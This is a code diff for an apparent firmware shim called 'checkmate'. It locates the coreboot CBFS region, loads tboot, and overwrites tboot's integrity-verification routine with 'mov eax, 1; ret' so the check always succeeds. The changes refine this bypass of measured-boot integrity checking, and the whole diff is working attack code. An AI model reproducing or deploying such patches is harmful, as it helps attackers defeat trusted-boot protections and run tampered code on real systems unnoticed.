@@ -20,9 +20,8 @@
 #include <stddef.h>
 #include "com.h"
 #include "cbfs_load.h"
-//#include "coreboot_table.h"
+#include "coreboot_table.h"
 
-#define TBOOT_LOAD_ADDR            0x1000000     //    adjust MLE base depending on spec if this doesn't work
 #define VERIFY_INTEGRITY_OFFSET     0x80af10
 #define CBFS_MASTER_HEADER_MAGIC  0x4F524243     //    orbc
 
@@ -34,10 +33,8 @@ void patch(const void* tboot_base) {
   serial_print_hex( (uint32_t)verify_integrity_addr );
   serial_print("\n");
 
-                  /*******************/
-                  // mov eax, 1; ret //             why the fuck am i doing this
-  size_t i;       /*******************/
-  uint8_t patch[] = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3};
+  size_t i;
+  uint8_t patch[] = {0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3};     //    mov eax, 1;  ret
   for (i = 0; i < sizeof(patch); i++) {
     ((uint8_t*)verify_integrity_addr)[i] = patch[i];
   }
@@ -87,24 +84,26 @@ void *bruteforce_cbfs_base_addr(uintptr_t start, uintptr_t end, uint32_t step) {
 //extern void* __cbfs_load(const char* name, size_t* size);
 void* tboot_load() {
   size_t tboot_size;
-  void* tboot_base = cbfs_load("tboot.gz", &tboot_size);
+  void* tboot_base = cbfs_load("tboot-bin", &tboot_size);
   if (!tboot_base) {
-    serial_print("checkmate:  failed to load tboot.gz\n");
+    serial_print("checkmate:  failed to load tboot-bin\n");
     return NULL;
   }
+
   return tboot_base;
 }
 
 void shim_main() {
   serial_print("checkmate:  shim running post-SINIT\n");
 
+//  uintptr_t search_start = 0xFF000000;     //  -16MB
+//  uintptr_t search_end   = 0xFFFFFFFF;     //    4GB
+//  uintptr_t search_step  =       4096;     //    page size ( 4KB ) increments
+//                                           //        see spec for page size..
+//
 
-  uintptr_t search_start = 0xFF000000;     //  -16MB
-  uintptr_t search_end   = 0xFFFFFFFF;     //    4GB
-  uintptr_t search_step  =       4096;     //    page size ( 4KB ) increments
-                                           //        see spec for page size..
-
-  CBFS_BASE_ADDR = bruteforce_cbfs_base_addr(search_start, search_end, search_step);
+//  CBFS_BASE_ADDR = bruteforce_cbfs_base_addr(search_start, search_end, search_step);
+  CBFS_BASE_ADDR = find_cbfs_base_addr();
   if ( !CBFS_BASE_ADDR ) {
     serial_print("checkmate:      failed to find CBFS base addr\n");
     return;
@@ -115,6 +114,7 @@ void shim_main() {
     serial_print("checkmate:      failed to load tboot\n");
     return;
   }
+  
   serial_print("checkmate:  tboot loaded @ ");
   serial_print_hex((uint32_t)tboot_base);
   serial_print("\n");
